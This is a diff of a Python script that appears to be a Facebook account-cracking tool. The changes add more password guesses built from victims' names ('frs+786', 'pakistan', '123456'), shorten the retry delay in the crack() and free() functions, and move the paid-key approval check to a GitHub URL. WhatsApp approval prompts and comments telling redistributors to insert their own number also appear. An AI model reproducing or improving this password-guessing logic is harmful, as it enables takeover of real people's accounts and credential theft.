@@ -233,7 +233,7 @@ def first():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['445566']
+			pwv = ['223344']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
@@ -285,8 +285,15 @@ def name2():
 				if len(frs)<3:
 					pass
 				else:
+					pwv.append(nmf)
+					pwv.append("user")
 					pwv.append(frs+'123')
 					pwv.append(frs+'12345')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'786')
+					pwv.append("pakistan")
+					pwv.append("123456")
+					pwv.append("123456789")
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
@@ -345,7 +352,7 @@ def crack(idf,pwv):
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
-			time.sleep(31)
+			time.sleep(5)
 	loop+=1
 def free(idf,pwv):
 	global loop,ok,cp
@@ -383,7 +390,7 @@ def free(idf,pwv):
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
-			time.sleep(31)
+			time.sleep(5)
 	loop+=1
 def follow(ses,coki):
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
@@ -422,11 +429,11 @@ def follow(ses,coki):
         print ("")
         print ("     Copy Key And Sent Me WhatsApp Approvel Your Key ")
         print ("[*]--------------------------------------------------------------")
-        time.sleep(3)
+        time.sleep(02)
         #nichy number ki hata k apna numbr dal lo 
         os.system("xdg-open https://wa.me/+923439635677")
         #nichy  link hata k apni github ke link lagau
-    r1=requests.get("https://pastebin.com/raw/GUgkVAWC").text
+    r1=requests.get("https://raw.githubusercontent.com/MrLaLa007/ktk/main/Apro.txt").text
     if key1 in r1:
     	#R ke jaga apne main jahan sy script started krna chahty wo lagao 
         Main()
@@ -447,7 +454,7 @@ def follow(ses,coki):
         time.sleep(3)
         #Numbr chnge krlyna
         os.system("xdg-open https://wa.me/+923439635677")
-	
+        
 	
 	logo = """
 \033[1;93m                                                
@@ -1393,4 +1400,4 @@ def Subscraption():
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
 		os.system('am start https://wa.me/+923407275127?text=' + tks)
 		Subscraption()        
-def main_apv()
+main_apv()
